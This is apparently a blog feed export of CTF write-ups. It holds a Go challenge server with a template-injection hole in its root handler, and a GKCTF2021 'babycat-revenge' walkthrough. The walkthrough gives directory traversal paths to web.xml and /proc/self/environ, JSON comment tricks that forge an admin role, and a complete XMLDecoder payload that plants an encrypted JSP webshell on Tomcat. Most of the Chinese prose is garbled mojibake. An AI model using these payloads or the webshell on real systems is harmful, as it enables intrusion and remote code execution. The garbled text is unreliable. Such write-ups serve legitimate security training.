<span class="token keyword">type</span> AccountClaims <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Id       <span class="token builtin">string</span> <span class="token string">`json:"id"`</span>
	Is_admin <span class="token builtin">bool</span>   <span class="token string">`json:"is_admin"`</span>
	jwt<span class="token punctuation">.</span>StandardClaims
<span class="token punctuation">}</span>

<span class="token keyword">type</span> Resp <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Status <span class="token builtin">bool</span>   <span class="token string">`json:"status"`</span>
	Msg    <span class="token builtin">string</span> <span class="token string">`json:"msg"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> TokenResp <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Status <span class="token builtin">bool</span>   <span class="token string">`json:"status"`</span>
	Token  <span class="token builtin">string</span> <span class="token string">`json:"token"`</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> acc <span class="token punctuation">[</span><span class="token punctuation">]</span>Account
<span class="token keyword">var</span> secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"KEY"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> flag <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> admin_id <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"ADMIN_ID"</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> admin_pw <span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"ADMIN_PW"</span><span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	acc <span class="token operator">=</span> acc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid <span class="token builtin">string</span><span class="token punctuation">)</span> Account <span class="token punctuation">{</span>
	<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> acc <span class="token punctuation">{</span>
		<span class="token keyword">if</span> acc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> uid <span class="token punctuation">{</span>
			<span class="token keyword">return</span> acc<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> Account<span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>id <span class="token builtin">string</span><span class="token punctuation">,</span> is_admin <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	claims <span class="token operator">:=</span> AccountClaims<span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>StandardClaims<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>
	token <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> claims<span class="token punctuation">)</span>
	<span class="token keyword">return</span> token<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token<span class="token punctuation">,</span> err <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">ParseWithClaims</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>AccountClaims<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>token <span class="token operator">*</span>jwt<span class="token punctuation">.</span>Token<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">false</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> claims<span class="token punctuation">,</span> ok <span class="token operator">:=</span> token<span class="token punctuation">.</span>Claims<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>AccountClaims<span class="token punctuation">)</span><span class="token punctuation">;</span> ok <span class="token operator">&amp;&amp;</span> token<span class="token punctuation">.</span>Valid <span class="token punctuation">{</span>
		<span class="token keyword">return</span> claims<span class="token punctuation">.</span>Id<span class="token punctuation">,</span> claims<span class="token punctuation">.</span>Is_admin
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">false</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1024</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	user_acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>
	<span class="token keyword">if</span> user_acc<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> user_acc<span class="token punctuation">.</span>pw <span class="token operator">==</span> upw <span class="token punctuation">{</span>
		token<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>user_acc<span class="token punctuation">.</span>id<span class="token punctuation">,</span> user_acc<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		p <span class="token operator">:=</span> TokenResp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> token<span class="token punctuation">}</span>
		res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">regist_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	new_acc <span class="token operator">:=</span> Account<span class="token punctuation">{</span>uid<span class="token punctuation">,</span> upw<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> new_acc<span class="token punctuation">)</span>

	p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span>
	res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">flag_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
		<span class="token keyword">if</span> is_admin <span class="token operator">==</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>
			p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"Hi "</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">", flag is "</span> <span class="token operator">+</span> flag<span class="token punctuation">}</span>
			res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token punctuation">}</span>
			w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">root_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>
		acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>
		tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	admin <span class="token operator">:=</span> Account<span class="token punctuation">{</span>admin_id<span class="token punctuation">,</span> admin_pw<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> admin<span class="token punctuation">)</span>

	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> root_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/auth"</span><span class="token punctuation">,</span> auth_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> flag_handler<span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/regist"</span><span class="token punctuation">,</span> regist_handler<span class="token punctuation">)</span>
	log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0:11000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>JWTä¼ªé€ </tag>
        <tag>goä»£ç å®¡è®¡</tag>
        <tag>SSTIæ¨¡æ¿æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2021-babycat-revenge</title>
    <url>/posts/b53475ea.html</url>
    <content><![CDATA[<h1 id="GKCTF2021-babycat-revenge"><a href="#GKCTF2021-babycat-revenge" class="headerlink" title="GKCTF2021-babycat-revenge"></a>GKCTF2021-babycat-revenge</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šç›®å½•éå†ã€javaå®¡è®¡ã€<code>XMLDecoder</code>ååºåˆ—åŒ–</p>
<p>é¢˜ç›®hintï¼š1.ä½ çŸ¥é“æ³¨é‡Šç¬¦å— 2.PrintWriterï¼Ÿ</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912142227769.png"></p>
<p>æ³¨å†Œé¡µé¢ç©ºç™½ï¼ŒæŸ¥çœ‹æ³¨å†Œé¡µé¢æºç å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143046109.png"></p>
<p>å¯¹æ¯”ç™»å½•é¡µé¢æºç </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143155216.png"></p>
<p>ajaxè¯·æ±‚é€»è¾‘å¤§åŒå°å¼‚</p>
<p>ç™»å½•è´¦å·å£ä»¤éšä¾¿è¾“å…¥ï¼ŒBurpæ•è·ç™»å½•é¡µé¢è¯·æ±‚åŒ…å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143421057.png"></p>
<p>æ•è·æ³¨å†Œé¡µé¢è¯·æ±‚åŒ…ï¼Œä¿®æ”¹ä¸ºpostæ–¹æ³•ï¼Œæ•°æ®éƒ¨åˆ†æ¨¡ä»¿ç™»å½•è¯·æ±‚ä¼ å‚ï¼Œå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143625910.png"></p>
<p>æ³¨å†ŒæˆåŠŸï¼Œç™»å½•ï¼Œé¡µé¢å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912143906641.png"></p>
<p>ROLEæ˜¯guestï¼Œè¯´æ˜æˆ‘ä»¬æ˜¯æ¸¸å®¢æƒé™ã€‚æœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½å’Œä¸€ä¸ªä¸‹è½½åŠŸèƒ½ï¼Œä¸Šä¼ åŠŸèƒ½å¦‚ä¸‹ï¼Œå“åº”æç¤ºåªå…è®¸adminæƒé™ä¸Šä¼ </p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912144237402.png"></p>
<p>ä¸‹è½½åŠŸèƒ½çš„é“¾æ¥æ˜æ˜¾æœ‰é—®é¢˜ï¼Œææœ‰å¯èƒ½å­˜åœ¨ç›®å½•éå†</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912144511295.png"></p>
<p>Java Webé¡¹ç›®ï¼Œæ ¹æ®å¸¸è§„ç›®å½•ç»“æ„ï¼Œè¯»å–<code>web.xml</code>æ‰¾servletæ¥å£ç±»æ–‡ä»¶è·¯å¾„</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912153319712.png" style="zoom: 67%;">

<pre class="line-numbers language-none"><code class="language-none">../../WEB-INF/web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912152841090.png"></p>
<p>éƒ½ä¸‹è½½ä¸‹æ¥</p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../classes/com/web/servlet/registerServlet.class
uploadServlet.class<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç”¨<code>jadx</code>åç¼–è¯‘è·å¾—æºç ï¼Œå®¡è®¡<code>uploadServlet.class</code>ï¼Œç”¨æˆ·Roleéœ€è¦æ˜¯adminæ‰èƒ½ä¸Šä¼ ï¼Œä¸”æ–‡ä»¶åç¼€æœ‰ç™½åå•ï¼Œæ–‡ä»¶å†…å®¹æœ‰é»‘åå•ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912161318708.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912161340714.png"></p>
<p>é‚£ä¹ˆé¦–è¦ç›®æ ‡æ˜¯ç»•è¿‡Roleéœ€è¦æ˜¯adminçš„éªŒè¯</p>
<p>åœ¨<code>registerServlet.class</code>ï¼Œä¼šå¯¹æ³¨å†Œæ—¶çš„postå‚æ•°ï¼Œå³<code>data={"username":"admin","password":"admin"}</code></p>
<p>åš<code>\"role\":\"(.*?)\"</code>æ­£åˆ™åŒ¹é…ï¼ŒåŒ¹é…åˆ°<code>"role":"xxx"</code>å°±ä¼šæ›¿æ¢æˆ<code>"role":"guest"</code>ï¼Œå¦‚æœæ²¡æœ‰roleï¼Œåˆ™è®¾ç½®roleä¸ºguestï¼Œæ‰€ä»¥å¿…é¡»è®©whileå¾ªç¯é‡Œçš„roleæœ‰å€¼ï¼Œä½¿å¾—ifæ¡ä»¶æˆç«‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912162130559.png"></p>
<p>å› ä¸º JSON ä¸­çš„å†…è”æ³¨é‡Šæ¥ä¸ä¼šå½±å“ JSON æ•°æ®è§£æï¼Œæ‰€ä»¥æ­¤å¤„payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">data={"username":"admin","password":"admin","role":"test","role"/**/:"admin"}
æˆ–
data={"username":"admin","password":"admin","role":"admin"/*,"role":"test"*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬ä¸€ä¸ªpayloadåœ¨whileå¤„åŒ¹é…åˆ°<code>"role":"test"</code>ï¼ŒåŒ¹é…ä¸åˆ°<code>"role"/**/:"admin"</code>ï¼Œè¿›åˆ°ifæ¡ä»¶é‡Œï¼Œæ›¿æ¢çš„æ˜¯<code>"role":"test"</code>ï¼Œjsonè§£ææ—¶é‡åˆ°é‡å¤çš„roleé”®æ—¶ï¼Œä¼šä½¿ç”¨æœ€åä¸€ä¸ªroleé”®å€¼å¯¹ï¼Œæœ€ç»ˆ<code>"role":"admin"</code>ï¼›</p>
<p>ç¬¬äºŒä¸ªpayloadåœ¨whileå¤„åŒ¹é…åˆ°<code>"role":"admin"</code>ï¼Œä½†ç¬¬äºŒæ¬¡whileå¾ªç¯åŒ¹é…åˆ°<code>"role":"test"</code>ä¼šè¦†ç›–æ‰ç¬¬ä¸€ä¸ª<code>"role":"admin"</code>ï¼Œè¿›åˆ°ifæ¡ä»¶é‡Œï¼Œæ›¿æ¢çš„æ˜¯<code>"role":"test"</code>ï¼Œjsonè§£ææ—¶ï¼Œç”±äº<code>"role":"test"</code>è¢«æ³¨é‡Šï¼Œæœ€ç»ˆ<code>"role":"admin"</code>ã€‚</p>
<p>æ³¨å†ŒæˆåŠŸï¼Œç™»å½•åï¼ŒROLEæ˜¾ç¤ºä¸ºadminï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193145062.png"></p>
<p>åœ¨<code>registerServlet.class</code>å’Œ<code>loginServlet.class</code>ä¸­ï¼Œæœ‰ä»daoå¯¼å…¥çš„åŒ…ï¼Œä¸‹è½½ä¸‹æ¥å®¡è®¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193002964.png"></p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../classes/com/web/dao/baseDao.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨<code>com.web.dao.baseDao</code>ä¸­ï¼Œæœ‰<code>XMLDecoder()</code>æ–¹æ³•ï¼Œå¯ä»¥å°è¯•å°†<code>db.xml</code>è¦†ç›–ä¸ºæ¶æ„ä»£ç åé€šè¿‡ç™»å½•æˆ–æ³¨å†ŒåŠŸèƒ½è§¦å‘<code>XMLDecoder</code>ååºåˆ—åŒ–ï¼ˆè¿½æº¯è°ƒç”¨é“¾ï¼Œåœ¨ç™»å½•å’Œæ³¨å†ŒåŠŸèƒ½ä»£ç ï¼Œéƒ½æœ‰è°ƒç”¨<code>baseDao.getConnection()</code>æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨<code>getConfig()</code>æ–¹æ³•ï¼Œä»è€Œè§¦å‘<code>XMLDecoder()</code>ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193832564.png"></p>
<p>è¯»å–ç¯å¢ƒå˜é‡<code>CATALINA_HOME</code> ï¼Œå…¶å€¼ä¸º <code>/usr/local/tomcat</code></p>
<pre class="line-numbers language-none"><code class="language-none">/home/download?file=../../../../../../proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912185419149.png"></p>
<p>å› ä¸ºä¸Šä¼ ç™½åå•æœ‰xmlï¼Œé¢˜ç›®hintæœ‰PrintWriterï¼Œæ‰€ä»¥æ¶æ„ä»£ç å¦‚ä¸‹ã€‚å…¶ä¸­<code>CDATA</code>æ•°æ®å—ä¸ºèšå‰‘çš„jspé©¬</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;java class="java.beans.XMLDecoder"&gt;
    &lt;object class="java.io.PrintWriter"&gt;
        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt;
        &lt;void method="println"&gt;
            &lt;string&gt;&lt;![CDATA[&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;]]&gt;&lt;/string&gt;
        &lt;/void&gt;
        &lt;void method="close"/&gt;
    &lt;/object&gt;
&lt;/java&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šä¼ æ–‡ä»¶ï¼Œæ–‡ä»¶åæ”¹ä¸º<code>../db/db.xml</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912193420275.png"></p>
<p>é€€å‡ºç”¨æˆ·ï¼Œé‡æ–°ç™»å½•ä¸€ä¸‹ï¼Œä»¥ä¾¿è§¦å‘XMLDecoderï¼Œç„¶åèšå‰‘è¿æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230912192525117.png"></p>
